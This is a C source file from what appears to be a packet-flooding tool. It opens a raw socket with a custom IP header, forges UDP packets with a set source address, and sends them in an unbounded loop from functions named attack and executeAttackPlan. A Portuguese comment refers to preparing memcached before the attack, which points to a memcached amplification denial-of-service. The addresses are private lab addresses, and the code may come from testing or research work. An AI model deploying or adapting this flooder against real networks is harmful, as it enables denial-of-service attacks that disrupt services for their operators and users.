#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <signal.h>
#include "c.h"
#include "PacketForge.h"
#include "strix.h"


volatile sig_atomic_t stop = 1;

static void sigint_handler( int signum )
{
  stop = 0;
  fprintf(stdout, "\nShutdown signal received\n");
}

static void 
attack( Packet * pkt )
{
  signal(SIGINT, sigint_handler);
  
  //Precisamos inserir os dados no memcached antes de iniciar o ataque
  while( likely(stop) ){
    send_packet( pkt ); 
  }
}

void 
executeAttackPlan( AttackPlan * plan )
{
  Packet * pkt = forgeUDP("192.168.0.145", "192.168.0.1", 6666);
  attack( pkt );
  release_packet( pkt );
}

/*Code inspired on t50 */
int 
create_socket( void )
{
  int fd, flag;
  uint32_t n = 1;

  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
  {
    fatal_error("Cannot open raw socket");
  }

/* Try to change the socket mode to NON BLOCKING. */
  if ((flag = fcntl(fd, F_GETFL)) == -1)
  {
    fatal_error("Cannot get socket flags");
  }

  if (fcntl(fd, F_SETFL, flag | O_NONBLOCK) == -1)
  {
    fatal_error("Cannot set socket to non-blocking mode");
  }


  /* Setting IP_HDRINCL. */
  /* NOTE: We will provide the IP header, but enabling this option, on linux,
           still makes the kernel calculates the checksum and total_length. */
  if ( setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &n, sizeof(n)) == -1 )
  {
    fatal_error("Cannot set socket options");
  }

  return fd;
}

/* Taken from t50 */
void 
close_socket( int fd)
{
  /* Close only if the descriptor is valid. */
  if (fd > 0)
  {
    close(fd);    // AS_SAFE!

    /* Added to avoid multiple socket closing. */
    fd = -1;
  }
}

bool 
send_packet( Packet * pkt)
{
  assert(NULL != pkt);


  if( unlikely( sendto(pkt->socket, pkt->packet_ptr, pkt->size, MSG_NOSIGNAL, (struct sockaddr *)&pkt->sin, sizeof(struct sockaddr_in)) == -1 ) ){
    return false;
  }

  return true;
}


